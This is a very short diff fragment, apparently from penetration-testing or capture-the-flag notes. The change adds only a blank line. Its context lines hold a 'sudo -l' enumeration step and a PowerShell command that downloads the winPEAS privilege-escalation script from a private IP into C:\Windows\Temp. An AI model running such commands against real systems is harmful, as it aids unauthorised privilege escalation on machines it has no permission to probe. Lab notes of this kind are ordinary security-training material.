@@ -23,3 +23,4 @@ sudo -l
 powershell Invoke-WebRequest -Uri http://10.8.102.117:80/winpeas.bat -Outfile 'C:\Windows\Temp\winpeas.bat'
 
 
+
